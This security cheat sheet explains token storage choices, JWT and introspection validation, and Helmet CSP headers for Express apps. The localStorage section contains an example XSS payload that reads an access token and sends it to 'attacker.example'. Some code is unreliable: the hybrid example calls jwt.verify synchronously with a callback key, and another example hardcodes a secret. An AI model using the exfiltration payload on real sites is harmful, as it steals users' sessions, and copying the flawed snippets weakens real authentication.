# Security & Token Storage Best Practices — Comprehensive Programming Cheat Sheet

---

## Topic Overview

### Definitions

**Core Definition:** Token storage security is the practice of choosing where and how to persist authentication credentials (access tokens, refresh tokens, session identifiers) in a browser or client application so that they cannot be stolen or misused by attackers. Token validation security is the process of verifying that a token presented to your API is authentic, unexpired, and still authorised for the requested operation.

**Technical Definition:** Token storage security concerns the selection of a persistence mechanism — HttpOnly, Secure, SameSite cookies; in-memory JavaScript variables; localStorage/sessionStorage; service workers; or a Backend-for-Frontend (BFF) pattern where tokens never reach the browser. Token validation security concerns the mechanism by which a Resource Server verifies an access token: synchronous local verification (validating a JWT signature against a cached JWKS) versus asynchronous remote introspection (RFC 7662, calling the authorization server's `/introspect` endpoint). Security headers (Helmet.js) provide defence-in-depth against XSS and cross-origin attacks that would otherwise make token theft trivial.

**Beginner-Friendly Explanation:** When you log into an app, the app receives a "key" (token) that proves who you are. Where you keep that key matters enormously: if you leave it in a place any script can read (localStorage), one malicious script can steal it. If you keep it in a locked box the browser manages (HttpOnly cookie), scripts cannot read it. Token validation is about checking the key is real and still valid — you can either check the signature yourself (fast, but revocation is delayed) or call the issuer every time (slower, but revocation is instant). Security headers are the fences and alarms that make it harder for an attacker to run malicious scripts in the first place.

### Key Characteristics

- **XSS is the dominant threat:** In an SPA, a single XSS flaw is "game over" — injected script runs with the full authority of the app. Token storage decisions are downstream of this reality.
- **localStorage is the wrong default:** OWASP has warned against localStorage tokens for years; anything written there is readable by any same-origin script.
- **BFF is the strongest pattern:** The IETF recommends the Backend-for-Frontend pattern where tokens never reach the browser at all — only an opaque session cookie does.
- **JWT verification is local and fast:** Signature validation using a cached JWKS costs microseconds with zero network calls, but cannot detect revocation until expiry.
- **Introspection is remote and slow:** Every protected request inherits a full round trip to the authorization server, but revocation takes effect immediately.
- **CSP is the backstop:** A strict Content-Security-Policy means that even if an injection lands, the browser refuses to execute the attacker's script.

### Prerequisites

- **Node.js runtime** (v18 or higher).
- **Express.js installed:** `npm install express helmet`.
- **Basic understanding of HTTP:** Cookies, headers, and the request–response cycle.
- **Familiarity with JWT and OAuth 2.0/OIDC concepts.**
- **A registered OAuth application** (for introspection examples).

### Related Programming Areas

- **OAuth 2.1 / OIDC:** The protocols that issue and manage tokens.
- **Cross-Site Scripting (XSS):** The primary threat to token storage.
- **Cross-Site Request Forgery (CSRF):** The threat introduced by cookie-based storage.
- **Content Security Policy (CSP):** Browser-enforced defence against injection.
- **Session management:** Token storage determines session lifetime and revocation capability.
- **Microservices:** JWKS caching and key rotation are critical at scale.

### Core Concepts

1. **Secure Storage** — HttpOnly, Secure, SameSite cookies vs. localStorage.
2. **Token Validation** — Synchronous local JWT verification vs. asynchronous introspection.
3. **Security Headers** — Helmet.js configuration for COOP and CSP.

---

## Core Concept 1: Secure Storage

### Definitions

**Core Definition:** Secure token storage is the practice of persisting authentication tokens in a location that is inaccessible to malicious JavaScript (XSS) and protected from cross-site request forgery (CSRF).

**Technical Definition:** The available storage mechanisms differ in their accessibility and security properties. **localStorage** and **sessionStorage** are readable by any JavaScript running in the same origin — a single XSS vulnerability exfiltrates every token. **HttpOnly cookies** are invisible to `document.cookie` and JavaScript read attempts, but are automatically attached to same-origin requests, introducing CSRF risk which must be mitigated with `SameSite` and anti-CSRF tokens. **In-memory variables** (a JavaScript closure) are not persisted and are lost on page refresh, but are not accessible via storage APIs. The **Backend-for-Frontend (BFF)** pattern keeps tokens entirely server-side, exposing only an opaque session cookie to the browser.

**Beginner-Friendly Explanation:** Think of token storage like deciding where to keep your house key. Putting it under the doormat (localStorage) means anyone who breaks in can grab it. Putting it in a locked safe (HttpOnly cookie) means even someone inside the house can't read it — but they can still use the door while they're there. The safest option (BFF) is to not keep a key in the house at all; instead, you have a butler who holds the key and opens doors for you.

### Purposes

- To prevent token theft via cross-site scripting (XSS).
- To prevent token misuse via cross-site request forgery (CSRF).
- To limit the blast radius of a successful XSS attack.
- To ensure tokens are only transmitted over secure channels (HTTPS).
- To provide a storage mechanism that balances security with usability.

### Sub-Feature 1.1: localStorage / sessionStorage

#### Definitions

**Core Definition:** localStorage and sessionStorage are Web Storage APIs that persist key-value pairs in the browser, accessible via JavaScript.

**Technical Definition:** `localStorage` persists until explicitly cleared; `sessionStorage` is cleared when the tab closes. Both are synchronous and accessible via `window.localStorage` and `window.sessionStorage`. Any JavaScript running in the same origin — including injected XSS payloads, compromised npm packages, and third-party ad tags — can read and exfiltrate their contents.

#### Syntax Rules and Structure

```js
localStorage.setItem('accessToken', token);
const token = localStorage.getItem('accessToken');
```

| Storage | Persistence | XSS Readable | CSRF Vulnerable |
|---------|-------------|-------------|-----------------|
| `localStorage` | Until cleared | Yes | No |
| `sessionStorage` | Until tab closes | Yes | No |

**Constraints and Limitations:**
- **CWE-79 (XSS) and CWE-522 (insufficiently protected credentials) intersect here.** A stolen token does not trigger a failed-login alert or MFA prompt — it just gets replayed.
- There is no browser permission model that scopes localStorage to "your code only."
- OWASP's guidance is unambiguous: session tokens should not be stored anywhere JavaScript can reach.

#### Annotated Code Example

```js
// localStorage-vulnerable.js — DO NOT USE IN PRODUCTION
// This demonstrates why localStorage is unsafe.

// After login, the SPA stores the token in localStorage
localStorage.setItem('accessToken', 'eyJhbGciOiJSUzI1NiIs...');

// An XSS payload (e.g., from an unsanitised comment field) runs:
const stolen = localStorage.getItem('accessToken');
fetch('https://attacker.example/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolen })
});
// The attacker now has the token and can replay it from any machine.
```

**Expected Output (attacker's server):**
```
POST /steal
{"token":"eyJhbGciOiJSUzI1NiIs..."}
```

**Why this output:** The XSS payload reads the token from localStorage in one line and POSTs it to the attacker's server. No browser warning, no CORS block — the read happens same-origin before exfiltration. The token is now permanently compromised until revoked.

### Sub-Feature 1.2: HttpOnly, Secure, SameSite Cookies

#### Definitions

**Core Definition:** HttpOnly cookies are cookies that are invisible to JavaScript (`document.cookie` cannot read them), Secure cookies are only transmitted over HTTPS, and SameSite cookies restrict cross-site transmission.

**Technical Definition:** The `HttpOnly` flag prevents client-side JavaScript from accessing the cookie via `document.cookie`, mitigating XSS token theft. The `Secure` flag ensures the cookie is only sent over HTTPS, preventing man-in-the-middle interception. The `SameSite` attribute controls whether the cookie is sent with cross-site requests: `Strict` (never cross-site), `Lax` (sent for top-level navigations), or `None` (always sent; requires `Secure`).

#### Syntax Rules and Structure

```js
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 900000,  // 15 minutes
  path: '/'
});
```

| Flag | Purpose | Recommended Value |
|------|---------|-------------------|
| `httpOnly` | Blocks JavaScript access | `true` |
| `secure` | HTTPS only | `true` (production) |
| `sameSite` | CSRF mitigation | `'lax'` or `'strict'` |
| `maxAge` | Cookie lifetime | Short (15 min for access tokens) |
| `path` | Cookie scope | `'/'` for site-wide |

**Rules:**
- `HttpOnly` stops token theft but does not stop in-session abuse — malicious JS can still fire authenticated `fetch()` calls that ride along on the victim's session.
- `SameSite=Lax` provides a balance between security and usability; `Strict` is more secure but breaks some legitimate cross-site flows.
- `SameSite=None` requires `Secure` and should only be used when genuinely needed (e.g., third-party embed).
- Always pair cookie-based storage with CSRF protection (anti-CSRF tokens or double-submit cookies).

#### Annotated Code Example

```js
// httpOnly-cookie.js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

app.post('/login', (req, res) => {
  // After validating credentials, issue an HttpOnly cookie
  const token = generateAccessToken(req.user);

  res.cookie('accessToken', token, {
    httpOnly: true,      // JavaScript cannot read this
    secure: true,        // Only sent over HTTPS
    sameSite: 'lax',     // CSRF mitigation
    maxAge: 900000,      // 15 minutes
    path: '/'
  });

  res.json({ message: 'Logged in' });
});

// Protected route reads the cookie server-side
app.get('/api/profile', (req, res) => {
  const token = req.cookies.accessToken;  // Server reads it
  if (!token) return res.status(401).json({ error: 'No token' });
  // Verify token...
  res.json({ user: 'Alice' });
});

app.listen(3000, () => console.log('HttpOnly cookie on 3000'));
```

**Expected Output (for `GET /api/profile` with valid cookie):**
```json
{"user":"Alice"}
```

**Expected Output (for `GET /api/profile` without cookie):**
```json
{"error":"No token"}
```

**Why this output:** The token is stored in an HttpOnly cookie, so JavaScript cannot read it. The server reads the cookie from the request and verifies it. An XSS attack cannot steal the token from `document.cookie` — but it could still make authenticated requests from the victim's browser during the session.

### Sub-Feature 1.3: In-Memory Storage

#### Definitions

**Core Definition:** In-memory storage keeps the access token in a JavaScript variable or closure, never persisted to disk or storage APIs.

**Technical Definition:** The token lives in a JavaScript variable (e.g., a module-scoped `let`) and is lost on page refresh or tab close. This is sometimes combined with a refresh token stored in an HttpOnly cookie: the access token stays in memory, and the refresh token (which is long-lived) is protected by HttpOnly and SameSite.

#### Syntax Rules and Structure

```js
// In-memory token store (lost on refresh)
let accessToken = null;

function setToken(token) {
  accessToken = token;
}

function getToken() {
  return accessToken;
}

// On page load, use the refresh token (HttpOnly cookie) to get a new access token
async function refreshAccessToken() {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'  // Send the HttpOnly refresh cookie
  });
  const data = await response.json();
  setToken(data.accessToken);
}
```

**Rules:**
- In-memory tokens are not accessible via localStorage, sessionStorage, or document.cookie — they are only accessible to the JavaScript closure that holds them.
- However, they are still accessible to any JavaScript running in the same context (an XSS payload can call `getToken()` if it can reach the closure).
- The refresh token must be stored in an HttpOnly cookie to survive page refreshes.

### Sub-Feature 1.4: Backend-for-Frontend (BFF) Pattern

#### Definitions

**Core Definition:** The BFF pattern keeps OAuth tokens entirely server-side, exposing only an opaque session cookie to the browser.

**Technical Definition:** The BFF acts as a confidential OAuth client. It handles the Authorization Code flow with PKCE, manages access and refresh tokens server-side, and maintains a cookie-based session with the browser. The frontend never sees a token. The BFF proxies all requests to resource servers, augmenting them with the correct access token before forwarding. If an attacker executes malicious code in the browser, there are no tokens to extract. The BFF is a confidential client, which prevents the attacker from running a new OAuth flow within the browser.

**Beginner-Friendly Explanation:** Instead of giving the browser a key to your house, you hire a butler (the BFF) who lives in the house. The browser only knows the butler's name (the session cookie). When the browser needs something from a resource server, it asks the butler, who uses the real key (the access token) on its behalf. If someone breaks into the browser, they can talk to the butler while they're inside, but they can't steal the key and use it later from somewhere else.

#### Syntax Rules and Structure

```js
// BFF architecture
// Browser → BFF (session cookie) → Resource Server (access token)

// BFF: OAuth client handling
app.get('/auth/login', (req, res) => {
  // Redirect to authorization server
  const authUrl = buildAuthUrl({ clientId, redirectUri, pkceChallenge });
  res.redirect(authUrl);
});

app.get('/auth/callback', async (req, res) => {
  // Exchange code for tokens (server-side)
  const tokens = await exchangeCodeForTokens(req.query.code, pkceVerifier);

  // Store tokens server-side, keyed by session ID
  const sessionId = generateSessionId();
  await sessionStore.set(sessionId, {
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
    expiresAt: Date.now() + tokens.expires_in * 1000
  });

  // Set only the session cookie in the browser
  res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax'
  });

  res.redirect('/');
});

// BFF: Proxying requests to resource servers
app.get('/api/*', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const session = await sessionStore.get(sessionId);

  if (!session) return res.status(401).json({ error: 'No session' });

  // Forward request with access token
  const response = await fetch(`https://resource-server${req.path}`, {
    headers: { Authorization: `Bearer ${session.accessToken}` }
  });

  res.json(await response.json());
});
```

**Rules:**
- The BFF is a **confidential client** — it can hold a client secret.
- Tokens are **never** exposed to JavaScript.
- The session cookie should be opaque (not a JWT) and stored server-side (Redis, database).
- The BFF must handle token refresh server-side when the access token expires.
- The BFF pattern is officially recommended by the IETF in RFC 10017 (published September 2026).

#### Constraints and Limitations

- Requires a server-side session store (Redis or similar) for production scale.
- Adds latency to every API call (the BFF proxies the request).
- More infrastructure to maintain than a pure SPA.

#### Annotated Code Example

```js
// bff-complete.js
const express = require('express');
const crypto = require('crypto');
const Redis = require('ioredis');
const app = express();

const redis = new Redis();

// In-memory session store (use Redis in production)
const sessions = new Map();

// Step 1: Redirect to authorization server
app.get('/auth/login', (req, res) => {
  const state = crypto.randomUUID();
  const codeVerifier = crypto.randomBytes(32).toString('base64url');
  const codeChallenge = crypto
    .createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');

  // Store PKCE verifier keyed by state
  sessions.set(state, { codeVerifier, createdAt: Date.now() });

  const authUrl = new URL('https://auth.example.com/authorize');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', 'bff-client');
  authUrl.searchParams.set('redirect_uri', 'http://localhost:3000/auth/callback');
  authUrl.searchParams.set('scope', 'openid profile email');
  authUrl.searchParams.set('state', state);
  authUrl.searchParams.set('code_challenge', codeChallenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');

  res.redirect(authUrl.toString());
});

// Step 2: Handle callback — tokens stay server-side
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  const session = sessions.get(state);

  if (!session) return res.status(400).send('Invalid state');
  sessions.delete(state);

  // Exchange code for tokens (server-to-server)
  const tokenResponse = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'http://localhost:3000/auth/callback',
      client_id: 'bff-client',
      client_secret: process.env.CLIENT_SECRET,  // BFF is confidential
      code_verifier: session.codeVerifier
    })
  });

  const tokens = await tokenResponse.json();

  // Generate opaque session ID
  const sessionId = crypto.randomBytes(32).toString('hex');

  // Store tokens server-side (Redis in production)
  sessions.set(sessionId, {
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
    expiresAt: Date.now() + tokens.expires_in * 1000,
    createdAt: Date.now()
  });

  // Set only the opaque session cookie
  res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 86400000  // 24 hours
  });

  res.redirect('/');
});

// Step 3: Proxy API requests with access token
app.get('/api/user', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const session = sessions.get(sessionId);

  if (!session) return res.status(401).json({ error: 'Not authenticated' });

  // Refresh token if expired
  if (Date.now() > session.expiresAt) {
    const refreshResponse = await fetch('https://auth.example.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: session.refreshToken,
        client_id: 'bff-client',
        client_secret: process.env.CLIENT_SECRET
      })
    });
    const newTokens = await refreshResponse.json();
    session.accessToken = newTokens.access_token;
    session.expiresAt = Date.now() + newTokens.expires_in * 1000;
  }

  // Forward request to resource server with access token
  const response = await fetch('https://api.example.com/user', {
    headers: { Authorization: `Bearer ${session.accessToken}` }
  });

  res.json(await response.json());
});

app.listen(3000, () => console.log('BFF pattern on 3000'));
```

**Expected Output (for `GET /api/user` with valid session cookie):**
```json
{"id":"user-12345","name":"Alice Johnson","email":"alice@example.com"}
```

**Expected Output (for `GET /api/user` without session cookie):**
```json
{"error":"Not authenticated"}
```

**Why this output:** The BFF handles the entire OAuth flow server-side. After authentication, only an opaque session ID cookie is set in the browser. The BFF looks up the session, retrieves the access token from server-side storage, and proxies the request to the resource server. The browser never sees a token — an XSS attack has nothing to steal.

### Real-World Cases

- **Duende Software:** RFC 10017 (BFF pattern) published as official IETF guidance in September 2026.
- **Auth0 SPA guide:** Recommends BFF for high-security SPAs; HttpOnly cookies as the minimum.
- **OWASP Session Management Cheat Sheet:** Explicitly warns against localStorage tokens.
- **CWE-522:** Insufficiently Protected Credentials — the vulnerability category for localStorage token storage.

---

## Core Concept 2: Token Validation

### Definitions

**Core Definition:** Token validation is the process by which a Resource Server verifies that an access token is authentic, unexpired, and authorised for the requested operation.

**Technical Definition:** Two primary mechanisms exist. **Local JWT verification (RFC 7519)** validates the token's signature in-process using a public key from the issuer's JWKS endpoint (RFC 7517), requiring no network call per request. **Token introspection (RFC 7662)** requires the Resource Server to POST the token to the authorization server's `/introspect` endpoint for every protected request, receiving back an `active` boolean and the token's metadata.

**Beginner-Friendly Explanation:** When your API receives a token, it needs to know "is this real?" There are two ways to check. You can verify the signature yourself using a public key the issuer published (like checking a wax seal against a known stamp) — fast, but if the issuer revokes a token, you won't know until it expires. Or you can call the issuer and ask "is this token still valid?" — slower, but you always get the current answer.

### Purposes

- To ensure that only authentic, unexpired tokens are accepted.
- To detect tampering with token claims.
- To enforce revocation when a token is compromised or a user is deprovisioned.
- To balance performance (local verification) against security freshness (introspection).

### Sub-Feature 2.1: Local JWT Verification

#### Definitions

**Core Definition:** Local JWT verification validates a token's signature and claims entirely within the Resource Server, using a cached public key from the issuer's JWKS endpoint.

**Technical Definition:** The Resource Server fetches the issuer's JSON Web Key Set (JWKS) from the `jwks_uri` specified in the OpenID Connect discovery document. Each key is tagged with a `kid`. The Resource Server extracts the `kid` from the JWT header, looks up the matching key in the cached JWKS, and verifies the signature using the public key. It then validates the `iss`, `aud`, `exp`, and `nbf` claims. No network call is made per request.

#### Syntax Rules and Structure

```js
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

const client = jwksClient({
  jwksUri: 'https://auth.example.com/.well-known/jwks.json',
  cache: true,
  cacheMaxAge: 600000,        // 10 minutes
  rateLimit: true,
  jwksRequestsPerMinute: 10
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return callback(err);
    callback(null, key.getPublicKey());
  });
}

jwt.verify(token, getKey, {
  algorithms: ['RS256'],
  issuer: 'https://auth.example.com',
  audience: 'api://my-service'
}, (err, payload) => {
  if (err) return res.status(401).json({ error: 'Invalid token' });
  req.user = payload;
  next();
});
```

**Rules:**
- The `algorithms` list **must** be explicitly specified to prevent algorithm confusion attacks.
- The `issuer` and `audience` **must** be verified on every token.
- The `kid` is a lookup hint, not a security decision — the key must come from the trusted JWKS endpoint.
- **JWKS caching:** Fetch no more frequently than once per minute; cache for minutes, not hours (to absorb key rotation); discard cached entries after a maximum of 24 hours.
- On a cache miss for an unknown `kid`, refresh the JWKS once before returning `unknown_key`.

#### Constraints and Limitations

- **Revocation is delayed:** A JWT stays valid until it expires, even if the user is deprovisioned. Short access token lifetimes (minutes, not hours) are strongly recommended.
- **Key rotation requires JWKS refresh:** If the issuer rotates signing keys, the Resource Server must fetch the new JWKS.
- **JWKS endpoint availability:** If the issuer's JWKS endpoint is down, local verification survives until keys expire (unlike introspection, which fails immediately).

#### Annotated Code Example

```js
// local-jwt-verification.js
const express = require('express');
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');
const app = express();

// JWKS client with caching and rate limiting
const client = jwksClient({
  jwksUri: 'https://your-tenant.auth0.com/.well-known/jwks.json',
  cache: true,
  cacheMaxAge: 600000,        // 10 minutes
  rateLimit: true,
  jwksRequestsPerMinute: 10,
  timeout: 30000
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return callback(err);
    callback(null, key.getPublicKey());
  });
}

// Middleware: verify JWT locally
function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];

  jwt.verify(token, getKey, {
    algorithms: ['RS256'],
    issuer: 'https://your-tenant.auth0.com/',
    audience: 'api://my-service'
  }, (err, payload) => {
    if (err) {
      return res.status(401).json({ error: 'Invalid token', detail: err.message });
    }
    req.user = { sub: payload.sub, email: payload.email };
    next();
  });
}

app.get('/api/profile', requireAuth, (req, res) => {
  res.json({ user: req.user });
});

app.listen(3000, () => console.log('Local JWT verification on 3000'));
```

**Expected Output (for `GET /api/profile` with valid JWT):**
```json
{"user":{"sub":"auth0|12345","email":"alice@example.com"}}
```

**Expected Output (for expired JWT):**
```json
{"error":"Invalid token","detail":"jwt expired"}
```

**Why this output:** The JWKS client fetches the issuer's public keys and caches them. The `jwt.verify` function retrieves the key matching the token's `kid`, verifies the RS256 signature, and validates the `iss` and `aud` claims. If the signature is invalid or the token is expired, verification fails. No network call is made per request — all validation is in-process.

### Sub-Feature 2.2: Token Introspection (RFC 7662)

#### Definitions

**Core Definition:** Token introspection is a mechanism where the Resource Server asks the authorization server whether a token is active and what it grants.

**Technical Definition:** The Resource Server POSTs the token to the authorization server's `/introspect` endpoint (RFC 7662). The authorization server responds with a JSON object containing an `active` boolean and, if active, the token's metadata (`scope`, `client_id`, `exp`, `sub`, etc.). The introspection endpoint requires the caller to authenticate — an unauthenticated request is rejected.

#### Syntax Rules and Structure

```js
const response = await fetch('https://auth.example.com/introspect', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': `Basic ${Buffer.from(`${clientId}:${clientSecret}`).toString('base64')}`
  },
  body: new URLSearchParams({ token: accessToken })
});

const introspection = await response.json();
// { active: true, scope: 'read:profile', client_id: '...', exp: 1736997300 }
```

| Field | Description |
|-------|-------------|
| `active` | Whether the token is currently active. |
| `scope` | Space-delimited scopes granted. |
| `client_id` | Client the token was issued to. |
| `exp` | Expiration timestamp. |
| `sub` | Subject (user identifier). |

**Rules:**
- The introspection endpoint **must** require the caller to authenticate.
- The authorization server **must not** reveal why a token is inactive.
- Introspection provides **immediate revocation** — the next request is rejected.
- Introspection adds a network round trip to every protected request.

#### Constraints and Limitations

- **Latency:** Every request inherits a full round trip to the authorization server.
- **Single point of failure:** If the authorization server is down, all APIs reject traffic.
- **Scaling bottleneck:** At high traffic, the introspection endpoint becomes a shared dependency every API node hammers at once.
- **Token remains opaque:** Introspection is required when tokens are reference tokens (not JWTs).

#### Annotated Code Example

```js
// introspection-validation.js
const express = require('express');
const app = express();

const AUTH_SERVER = 'https://auth.example.com';
const CLIENT_ID = 'resource-server';
const CLIENT_SECRET = 'secret';

// Middleware: validate token via introspection
async function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const response = await fetch(`${AUTH_SERVER}/introspect`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': `Basic ${Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString('base64')}`
      },
      body: new URLSearchParams({ token })
    });

    const introspection = await response.json();

    if (!introspection.active) {
      return res.status(401).json({ error: 'Token is not active' });
    }

    req.user = {
      sub: introspection.sub,
      scope: introspection.scope,
      clientId: introspection.client_id
    };

    next();
  } catch (err) {
    return res.status(503).json({ error: 'Authorization server unavailable' });
  }
}

app.get('/api/data', requireAuth, (req, res) => {
  res.json({ user: req.user, data: 'protected' });
});

app.listen(3000, () => console.log('Introspection validation on 3000'));
```

**Expected Output (for active token):**
```json
{"user":{"sub":"user-12345","scope":"read:data","clientId":"app-1"},"data":"protected"}
```

**Expected Output (for revoked token):**
```json
{"error":"Token is not active"}
```

**Expected Output (when authorization server is down):**
```json
{"error":"Authorization server unavailable"}
```

**Why this output:** The middleware POSTs the token to the `/introspect` endpoint for every request. The authorization server returns `active: true` if the token is valid and not revoked. If the token is revoked, `active` is `false` and the request is rejected immediately — revocation takes effect on the next request. If the authorization server is unreachable, the middleware returns a 503 (unlike local verification, which would continue working).

### Sub-Feature 2.3: Hybrid Approach — Local Verification + Introspection Fallback

#### Definitions

**Core Definition:** The hybrid approach verifies most tokens locally (fast, scalable) and calls introspection only for high-value operations or when revocation must be confirmed.

**Technical Definition:** Most high-traffic systems converge on a hybrid: local verification on the hot path, introspection or a deny list reserved for high-value tokens. A common pattern is to verify the JWT locally on most calls and call introspection only on sensitive operations (e.g., payment, data export, admin actions).

#### Syntax Rules and Structure

```js
async function validateToken(token, isHighValue = false) {
  // Step 1: Local verification (always)
  let payload;
  try {
    payload = jwt.verify(token, getKey, {
      algorithms: ['RS256'],
      issuer: ISSUER,
      audience: AUDIENCE
    });
  } catch (err) {
    throw new Error('Invalid token');
  }

  // Step 2: Check deny list (fast revocation for known-bad tokens)
  const isDenied = await redis.sismember('denied_tokens', payload.jti);
  if (isDenied) throw new Error('Token revoked');

  // Step 3: Introspection for high-value operations
  if (isHighValue) {
    const introspection = await introspect(token);
    if (!introspection.active) throw new Error('Token not active');
  }

  return payload;
}
```

#### Annotated Code Example

```js
// hybrid-validation.js
const express = require('express');
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');
const Redis = require('ioredis');
const app = express();

const redis = new Redis();
const client = jwksClient({
  jwksUri: 'https://auth.example.com/.well-known/jwks.json',
  cache: true,
  cacheMaxAge: 600000
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return callback(err);
    callback(null, key.getPublicKey());
  });
}

async function validateToken(token, isHighValue = false) {
  // Step 1: Local JWT verification (fast path)
  let payload;
  try {
    payload = jwt.verify(token, getKey, {
      algorithms: ['RS256'],
      issuer: 'https://auth.example.com',
      audience: 'api://my-service'
    });
  } catch (err) {
    throw new Error('Invalid token: ' + err.message);
  }

  // Step 2: Deny-list check (for revoked tokens with known JTIs)
  const isDenied = await redis.sismember('denied_tokens', payload.jti);
  if (isDenied) throw new Error('Token has been revoked');

  // Step 3: Introspection for high-value operations
  if (isHighValue) {
    const response = await fetch('https://auth.example.com/introspect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': `Basic ${Buffer.from('rs:secret').toString('base64')}`
      },
      body: new URLSearchParams({ token })
    });
    const introspection = await response.json();
    if (!introspection.active) throw new Error('Token not active');
  }

  return payload;
}

// Standard route — local verification only
app.get('/api/posts', async (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    const user = await validateToken(token, false);
    res.json({ posts: [], user: user.sub });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});

// High-value route — local verification + introspection
app.post('/api/payments', async (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    const user = await validateToken(token, true);  // Introspection enabled
    res.json({ message: 'Payment processed', user: user.sub });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});

app.listen(3000, () => console.log('Hybrid validation on 3000'));
```

**Expected Output (for `GET /api/posts` with valid token):**
```json
{"posts":[],"user":"user-12345"}
```

**Expected Output (for `POST /api/payments` with revoked token):**
```json
{"error":"Token not active"}
```

**Why this output:** The `/api/posts` route uses local verification only — fast and scalable. The `/api/payments` route uses local verification **plus** introspection — ensuring that even if a token was recently revoked, the high-value operation is protected. The deny-list check catches revoked tokens whose JTIs are known.

### Real-World Cases

- **High-traffic APIs:** Local JWT verification with JWKS caching is the standard for APIs handling thousands of requests per second.
- **Financial services:** Introspection or hybrid verification for payment and account operations where immediate revocation is critical.
- **Keycloak:** Uses JWKS endpoint at `/realms/{realm}/protocol/openid-connect/certs` for local verification.
- **Auth0:** Provides both JWKS for local verification and `/introspect` for remote validation.

---

## Core Concept 3: Security Headers — Helmet.js Configuration

### Definitions

**Core Definition:** Helmet.js is an Express middleware that sets HTTP response headers to protect against well-known web vulnerabilities, including cross-site scripting (XSS), clickjacking, and cross-origin attacks.

**Technical Definition:** Helmet sets 15 security headers in a single middleware call. The two most critical for token security are **Content-Security-Policy (CSP)**, which restricts which sources of scripts, styles, and other resources the browser will load, and **Cross-Origin-Opener-Policy (COOP)** , which process-isolates your page from cross-origin windows, preventing cross-origin attacks that rely on window references.

**Beginner-Friendly Explanation:** Helmet is like installing security cameras, locks, and alarm systems on your web application. CSP tells the browser "only run scripts from these trusted sources" — so even if an attacker injects a script tag, the browser refuses to execute it. COOP tells the browser "don't let other websites access my window object" — preventing cross-origin attacks that could steal data or tokens.

### Purposes

- To mitigate cross-site scripting (XSS) by restricting script sources.
- To prevent clickjacking via `frame-ancestors`.
- To process-isolate the page from cross-origin windows via COOP.
- To enforce HTTPS via `upgrade-insecure-requests`.
- To provide defence-in-depth against injection attacks that would otherwise enable token theft.

### Sub-Feature 3.1: Content Security Policy (CSP)

#### Definitions

**Core Definition:** CSP is an HTTP response header that instructs the browser about which sources of content (scripts, styles, images, fonts) it is allowed to load.

**Technical Definition:** CSP works through a set of named directives. The `script-src` directive controls JavaScript execution. The strongest CSP modes use **nonces** (a unique random value per request, included in the header and on each script tag) or **hashes** (SHA-256/384/512 hashes of inline scripts). The `default-src` directive is the fallback for all resource types not explicitly configured.

#### Syntax Rules and Structure

```js
const crypto = require('crypto');

// Generate a unique nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Or use nonces for styles
    imgSrc: ["'self'", 'data:', 'https://cdn.example.com'],
    connectSrc: ["'self'", 'https://api.example.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: []
  }
}));
```

| Directive | Controls | Recommended Value |
|-----------|----------|-------------------|
| `default-src` | Fallback for all types | `'self'` |
| `script-src` | JavaScript sources | `'self'` + nonce |
| `style-src` | CSS sources | `'self'` + nonce |
| `img-src` | Image sources | `'self'` + CDN |
| `connect-src` | Fetch/XHR/WebSocket | `'self'` + API |
| `object-src` | Plugin content | `'none'` |
| `base-uri` | `<base>` tag sources | `'self'` |
| `frame-ancestors` | Who can frame you | `'none'` |
| `upgrade-insecure-requests` | Force HTTPS | `[]` (enabled) |

**Rules:**
- Avoid `'unsafe-inline'` — it defeats the policy entirely.
